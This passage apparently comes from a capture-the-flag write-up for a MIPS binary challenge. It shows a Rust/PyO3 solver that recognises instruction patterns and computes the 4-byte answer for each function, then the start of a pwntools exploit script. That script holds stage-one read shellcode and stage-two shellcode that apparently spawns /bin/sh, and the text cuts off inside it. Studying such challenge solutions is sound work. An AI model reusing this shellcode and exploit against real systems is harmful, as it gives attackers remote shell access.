    buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x30</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x31</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x32</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x33</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_xor</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    (
        buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x26</span> ||
        buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x66</span> ||
        buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0xa6</span> ||
        buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0xe6</span>
    ) &amp;&amp; buf[<span class="hljs-number">3</span>] &lt;= <span class="hljs-number">3</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_beq</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">2</span>] != <span class="hljs-number">0</span> &amp;&amp; (buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x10</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x11</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x12</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x13</span>)

}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_fn_start</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0xe0</span> &amp;&amp; buf[<span class="hljs-number">1</span>] == <span class="hljs-number">0xff</span> &amp;&amp; buf[<span class="hljs-number">2</span>] == <span class="hljs-number">0xbd</span> &amp;&amp; buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x27</span>
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FunctionIter</span></span>&lt;<span class="hljs-symbol">'s</span>&gt; {
    pos: <span class="hljs-keyword">u64</span>,
    n: <span class="hljs-keyword">usize</span>,
    reader: BufReader&lt;Cursor&lt;&amp;<span class="hljs-symbol">'s</span> [<span class="hljs-keyword">u8</span>]&gt;&gt;,
}

<span class="hljs-keyword">impl</span>&lt;<span class="hljs-symbol">'s</span>&gt; FunctionIter&lt;<span class="hljs-symbol">'s</span>&gt; {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">new</span></span>(reader: BufReader&lt;Cursor&lt;&amp;<span class="hljs-symbol">'s</span> [<span class="hljs-keyword">u8</span>]&gt;&gt;, pos: <span class="hljs-keyword">u64</span>) -&gt; <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> {
            pos: pos,
            n: <span class="hljs-number">0</span>,
            reader: reader
        }
    }
}

<span class="hljs-keyword">impl</span>&lt;<span class="hljs-symbol">'s</span>&gt; <span class="hljs-built_in">Iterator</span> <span class="hljs-keyword">for</span> FunctionIter&lt;<span class="hljs-symbol">'s</span>&gt; {
    <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">Item</span></span> = Summary;

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">next</span></span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">Option</span>&lt;Summary&gt; {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.n == <span class="hljs-number">16</span> {
            <span class="hljs-literal">None</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> buf = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];
            <span class="hljs-keyword">loop</span> {
                <span class="hljs-keyword">self</span>.pos -= <span class="hljs-number">4</span>;
                <span class="hljs-keyword">self</span>.reader.seek(SeekFrom::Start(<span class="hljs-keyword">self</span>.pos)).unwrap();
                <span class="hljs-keyword">self</span>.reader.read_exact(&amp;<span class="hljs-keyword">mut</span> buf).unwrap();
                <span class="hljs-keyword">if</span> is_fn_start(&amp;buf) {
                    <span class="hljs-keyword">self</span>.n += <span class="hljs-number">1</span>;
                    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"function at 0x{:x}"</span>, <span class="hljs-keyword">self</span>.pos);
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">Some</span>(Summary::new(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.reader));
                }
            }
        }
    }
}

<span class="hljs-meta">#[derive(Default, Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Summary</span></span> {
    comps: <span class="hljs-built_in">Vec</span>&lt;u16&gt;,
    idxs: <span class="hljs-built_in">Vec</span>&lt;<span class="hljs-keyword">usize</span>&gt;,
    mult_cnt: <span class="hljs-keyword">u8</span>,
    andi_cnt: <span class="hljs-keyword">u8</span>,
    addu_cnt: <span class="hljs-keyword">u8</span>,
    beq_cnt: <span class="hljs-keyword">u8</span>,
    bne_cnt: <span class="hljs-keyword">u8</span>,
    xor_cnt: <span class="hljs-keyword">u8</span>,
    lbu_cnt: <span class="hljs-keyword">u8</span>,
    beq_first: <span class="hljs-keyword">bool</span>,
}

<span class="hljs-keyword">impl</span> Summary {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">new</span></span>(reader: &amp;<span class="hljs-keyword">mut</span> io::BufReader&lt;Cursor&lt;&amp;[<span class="hljs-keyword">u8</span>]&gt;&gt;) -&gt; <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = Self::<span class="hljs-keyword">default</span>();
        s.beq_first = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> ignore_lbu = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>..).step_by(<span class="hljs-number">4</span>) {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> cur = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];
            reader.read_exact(&amp;<span class="hljs-keyword">mut</span> cur).unwrap();
            <span class="hljs-keyword">if</span> is_fn_start(&amp;cur) {
                <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(v) = li_val(&amp;cur) {
                s.comps.push(v);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(v) = addiu_val(&amp;cur) {
                <span class="hljs-keyword">if</span> v &lt;= <span class="hljs-number">3</span> {
                    s.idxs.push(v <span class="hljs-keyword">as</span> <span class="hljs-keyword">usize</span>);
                    ignore_lbu += <span class="hljs-number">1</span>;
                }
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_lbu(&amp;cur) {
                s.lbu_cnt += <span class="hljs-number">1</span>;
                <span class="hljs-keyword">if</span> ignore_lbu &gt; <span class="hljs-number">0</span> {
                    ignore_lbu -= <span class="hljs-number">1</span>;
                } <span class="hljs-keyword">else</span> {
                    s.idxs.push(<span class="hljs-number">0</span>);
                }
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_andi(&amp;cur) {
                s.andi_cnt += <span class="hljs-number">1</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_beq(&amp;cur) {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"cur {:?} {}"</span>, cur, i);
                s.beq_cnt += <span class="hljs-number">1</span>;
                <span class="hljs-keyword">if</span> s.bne_cnt == <span class="hljs-number">0</span> {
                    s.beq_first = <span class="hljs-literal">true</span>;
                }
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_addu(&amp;cur) {
                s.addu_cnt += <span class="hljs-number">1</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_bne(&amp;cur) {
                s.bne_cnt += <span class="hljs-number">1</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_mult(&amp;cur) {
                s.mult_cnt += <span class="hljs-number">1</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> is_xor(&amp;cur) {
                s.xor_cnt += <span class="hljs-number">1</span>;
            }
        }

        s
    }
}

<span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Pattern</span></span> {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span>;
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>];
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span>;
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SumEqualOr</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> SumEqualOr {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.beq_cnt == <span class="hljs-number">3</span> &amp;&amp; s.addu_cnt == <span class="hljs-number">3</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, _: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-comment">// 1 / 256 not correct</span>
        [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"SumEqualOr"</span>
    }
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">XorComplicated</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> XorComplicated {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.andi_cnt == <span class="hljs-number">5</span> &amp;&amp; s.lbu_cnt == <span class="hljs-number">10</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-keyword">let</span> cmp1 = s.comps[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        <span class="hljs-keyword">let</span> cmp2 = s.comps[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        <span class="hljs-keyword">let</span> idx = s.idxs[<span class="hljs-number">0</span>];

        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> solution = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>];
        solution[(idx + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = cmp2;
        solution[idx] = cmp2 ^ cmp1;
        solution[(idx + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = (cmp1 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">1</span>;
        solution[(idx + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = cmp1 ^ solution[(idx + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>];

        solution
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"XorComplicated"</span>
    }
}


<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IfLessThan</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> IfLessThan {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.mult_cnt == <span class="hljs-number">8</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-keyword">let</span> i = s.idxs[<span class="hljs-number">0</span>];

        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> sol = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"summary: {:?}"</span>, s);
        <span class="hljs-keyword">if</span> s.beq_first {
            <span class="hljs-comment">// v1 &lt; v2</span>
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v1 &lt; v2"</span>);
            <span class="hljs-keyword">if</span> s.beq_cnt == <span class="hljs-number">2</span> {
                <span class="hljs-comment">// v1 &lt; v2</span>
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v1 &lt; v2"</span>);
                sol[i] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;
                sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">2</span>;
                sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> s.bne_cnt == <span class="hljs-number">1</span> &amp;&amp; s.beq_cnt == <span class="hljs-number">1</span> {
                <span class="hljs-comment">// v2 &lt; v1</span>
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v2 &lt; v1"</span>);
                sol[i] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">2</span>;
                sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;
                sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"summary error"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// v2 &lt; v1</span>
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v2 &lt; v1"</span>);
            <span class="hljs-keyword">if</span> s.bne_cnt == <span class="hljs-number">2</span> {
                <span class="hljs-comment">// v2 &lt; v1</span>
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v2 &lt; v1"</span>);
                sol[i] = <span class="hljs-number">2</span>;
                sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> s.bne_cnt == <span class="hljs-number">1</span> &amp;&amp; s.beq_cnt == <span class="hljs-number">1</span> {
                <span class="hljs-comment">// v1 &lt; v2</span>
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"v1 &lt; v2"</span>);
                sol[i] = <span class="hljs-number">1</span>;
                sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;
                sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = <span class="hljs-number">2</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"summary error"</span>);
            }
        }

        sol

    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"IfLessThan"</span>
    }
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MultComplicated</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> MultComplicated {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.mult_cnt == <span class="hljs-number">4</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-keyword">let</span> idx = s.idxs[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">let</span> cmp1 = s.comps[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">let</span> cmp2 = s.comps[<span class="hljs-number">1</span>];

        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> solution = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];
        solution[idx] = cmp1 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        solution[(idx + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = cmp2 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        solution[(idx + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = (cmp1 * cmp1) <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        solution[(idx + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = ((solution[(idx + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] * solution[(idx + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] + solution[(idx + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] * solution[(idx + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>]) - solution[idx] * solution[idx]) <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        solution
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"MultComplicated"</span>
    }
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DirectComp</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> DirectComp {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.bne_cnt == <span class="hljs-number">4</span> &amp;&amp; s.lbu_cnt == <span class="hljs-number">6</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-keyword">let</span> i = s.idxs[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> sol = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];
        sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = s.comps[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = s.comps[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = s.comps[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[(i + <span class="hljs-number">0</span>) % <span class="hljs-number">4</span>] = s.comps[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"DirectComp"</span>
    }
}

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Equation</span></span>;

<span class="hljs-keyword">impl</span> Pattern <span class="hljs-keyword">for</span> Equation {
    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">validate</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; <span class="hljs-keyword">bool</span> {
        s.addu_cnt == <span class="hljs-number">8</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(&amp;<span class="hljs-keyword">self</span>, s: &amp;Summary) -&gt; [<span class="hljs-keyword">u8</span>; <span class="hljs-number">4</span>] {
        <span class="hljs-keyword">let</span> a = s.comps[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">let</span> b = s.comps[<span class="hljs-number">1</span>];
        <span class="hljs-keyword">let</span> c = s.comps[<span class="hljs-number">2</span>];
        <span class="hljs-keyword">let</span> d = s.comps[<span class="hljs-number">3</span>];

        <span class="hljs-keyword">let</span> i = s.idxs[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> sol = [<span class="hljs-number">0u8</span>; <span class="hljs-number">4</span>];

        <span class="hljs-keyword">let</span> x3 = (d + b + c - <span class="hljs-number">2</span> * a) / <span class="hljs-number">3</span>;
        <span class="hljs-keyword">let</span> x2 = x3 + a - d;
        <span class="hljs-keyword">let</span> x1 = x3 + a - c;
        <span class="hljs-keyword">let</span> x0 = a - b + x3;
        sol[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>] = x3 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[(i + <span class="hljs-number">2</span>) % <span class="hljs-number">4</span>] = x2 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>] = x1 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;
        sol[i] = x0 <span class="hljs-keyword">as</span> <span class="hljs-keyword">u8</span>;

        sol
    }

    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">what</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">str</span> {
        <span class="hljs-string">"Equation"</span>
    }
}

<span class="hljs-meta">#[pyfunction]</span>
<span class="hljs-comment">/// Formats the sum of two numbers as string</span>
<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">solve</span></span>(bin: &amp;[<span class="hljs-keyword">u8</span>], first: <span class="hljs-keyword">u64</span>) -&gt; PyResult&lt;<span class="hljs-built_in">Vec</span>&lt;<span class="hljs-keyword">u8</span>&gt;&gt; {

    <span class="hljs-comment">//let first_func_regex = Regex::new(r"\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xbe\xaf\x25\xf0\xa0\x03\x20\x00\xc4\xaf\x20\x00\xc4\x8f.{4}\x00\x00\x00\x00\x25\xe8\xc0\x03\x1c\x00\xbf\x8f").unwrap();</span>
    <span class="hljs-comment">//let first_func_regex = Regex::new(r"\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xbe\xaf\x25\xf0\xa0\x03\x20\x00\xc4\xaf\x20\x00\xc4\x8f").unwrap();</span>
    <span class="hljs-comment">//let pos = first_func_regex.find(bin).unwrap().start() as u64;</span>
    <span class="hljs-keyword">let</span> reader = io::BufReader::new(Cursor::new(bin));

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> answer = <span class="hljs-built_in">Vec</span>::new();
    <span class="hljs-keyword">let</span> patterns: <span class="hljs-built_in">Vec</span>&lt;<span class="hljs-built_in">Box</span>&lt;dyn Pattern&gt;&gt; = <span class="hljs-built_in">vec!</span>[
        <span class="hljs-built_in">Box</span>::new(Equation),
        <span class="hljs-built_in">Box</span>::new(DirectComp),
        <span class="hljs-built_in">Box</span>::new(MultComplicated),
        <span class="hljs-built_in">Box</span>::new(IfLessThan),
        <span class="hljs-built_in">Box</span>::new(XorComplicated),
        <span class="hljs-built_in">Box</span>::new(SumEqualOr),
    ];

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> i = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> FunctionIter::new(reader, first) {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"solving {}...  "</span>, i);
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> solved = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> patterns.iter() {
            <span class="hljs-keyword">if</span> p.validate(&amp;s) {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"pattern: {}"</span>, p.what());
                solved = <span class="hljs-literal">true</span>;
                answer.extend_from_slice(&amp;p.solve(&amp;s));
            }
        }

        <span class="hljs-keyword">if</span> !solved {
            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"got unknown pattern, on function #{}"</span>, i);
        }

        i += <span class="hljs-number">1</span>;
    }

    <span class="hljs-literal">Ok</span>(answer)
}

<span class="hljs-comment">/// This module is a python module implemented in Rust.</span>
<span class="hljs-meta">#[pymodule]</span>
<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">runner_solver</span></span>(_py: Python, m: &amp;PyModule) -&gt; PyResult&lt;()&gt; {
    m.add_wrapped(wrap_pyfunction!(solve))?;

    <span class="hljs-literal">Ok</span>(())
}</code></pre><pre class="hljs"><code>#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety &lt;anciety@anciety-pc&gt;
#
# Distributed under terms of the MIT license.
import sys
import datetime
import os
import os.path
import base64
import gzip
import solver.target.release.runner_solver as solver
from pwn import *
context(os='linux', arch='mips', log_level='debug')
context.terminal = ['notiterm', '-t', 'iterm', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) &gt; 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)

stage1 = '''
sc = """
move <span class="hljs-formula">$a0,$</span>zero
addi <span class="hljs-formula">$a1,$</span>t9,20
li <span class="hljs-formula">$a2,0x7f
li $</span>v0,SYS_read
syscall 0x40404
'''
stage1 = b'<span class="hljs-comment">% \x00\x00\x14\x00%#\x7f\x00\x06$\xa3\x0f\x02$\x0c\x01\x01\x01'</span>


stage2 = b"bi<span class="hljs-tag">\<span class="hljs-name">t</span></span>&lt;//)5<span class="hljs-tag">\<span class="hljs-name">xf</span></span>4<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>9<span class="hljs-tag">\<span class="hljs-name">xafsh</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span>&lt;n/)5<span class="hljs-tag">\<span class="hljs-name">xf</span></span>8<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>9<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>4<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">xbd</span></span>'  <span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span 